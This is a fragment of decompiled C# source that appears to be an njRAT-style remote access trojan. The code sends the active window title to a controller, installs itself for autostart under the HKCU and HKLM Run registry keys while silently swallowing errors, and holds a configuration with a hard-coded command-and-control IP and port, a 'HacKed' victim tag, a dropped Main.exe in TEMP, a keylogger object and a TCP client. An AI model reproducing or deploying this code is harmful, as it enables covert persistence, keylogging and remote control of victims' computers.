							if (Operators.CompareString(left, text, false) != 0)
							{
								left = text;
								OK.Send("act" + OK.Y + text);
							}
						}
						if (OK.Isu)
						{
							try
							{
								if (Operators.ConditionalCompareObjectNotEqual(OK.F.Registry.CurrentUser.GetValue(OK.sf + "\\" + OK.RG, ""), "\"" + OK.LO.FullName + "\" ..", false))
								{
									OK.F.Registry.CurrentUser.OpenSubKey(OK.sf, true).SetValue(OK.RG, "\"" + OK.LO.FullName + "\" ..");
								}
							}
							catch (Exception ex5)
							{
							}
							try
							{
								if (Operators.ConditionalCompareObjectNotEqual(OK.F.Registry.LocalMachine.GetValue(OK.sf + "\\" + OK.RG, ""), "\"" + OK.LO.FullName + "\" ..", false))
								{
									OK.F.Registry.LocalMachine.OpenSubKey(OK.sf, true).SetValue(OK.RG, "\"" + OK.LO.FullName + "\" ..");
								}
							}
							catch (Exception ex6)
							{
							}
						}
					}
					catch (Exception ex7)
					{
					}
				}
			}
		}

		// Token: 0x04000001 RID: 1
		public static string VN = "SGFjS2Vk";

		// Token: 0x04000002 RID: 2
		public static string VR = "0.7d";

		// Token: 0x04000003 RID: 3
		public static object MT = null;

		// Token: 0x04000004 RID: 4
		public static string EXE = "Main.exe";

		// Token: 0x04000005 RID: 5
		public static string DR = "TEMP";

		// Token: 0x04000006 RID: 6
		public static string RG = "2536aea58226f0164dbe62516a4e7b46";

		// Token: 0x04000007 RID: 7
		public static string H = "116.44.216.57";

		// Token: 0x04000008 RID: 8
		public static string P = "6974";

		// Token: 0x04000009 RID: 9
		public static string Y = "|'|'|";

		// Token: 0x0400000A RID: 10
		public static bool BD = Conversions.ToBoolean("False");

		// Token: 0x0400000B RID: 11
		public static bool Idr = Conversions.ToBoolean("True");

		// Token: 0x0400000C RID: 12
		public static bool IsF = Conversions.ToBoolean("True");

		// Token: 0x0400000D RID: 13
		public static bool Isu = Conversions.ToBoolean("True");

		// Token: 0x0400000E RID: 14
		public static FileInfo LO = new FileInfo(Assembly.GetEntryAssembly().Location);

		// Token: 0x0400000F RID: 15
		public static FileStream FS;

		// Token: 0x04000010 RID: 16
		public static Computer F = new Computer();

		// Token: 0x04000011 RID: 17
		public static kl kq = null;

		// Token: 0x04000012 RID: 18
		public static bool Cn = false;

		// Token: 0x04000013 RID: 19
		public static string sf = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";

		// Token: 0x04000014 RID: 20
		public static TcpClient C = null;

		// Token: 0x04000015 RID: 21
		private static MemoryStream MeM = new MemoryStream();

		// Token: 0x04000016 RID: 22
		private static byte[] b = new byte[5121];

		// Token: 0x04000017 RID: 23
		private static string lastcap = "";

		// Token: 0x04000018 RID: 24
		public static object PLG = null;
	}
}
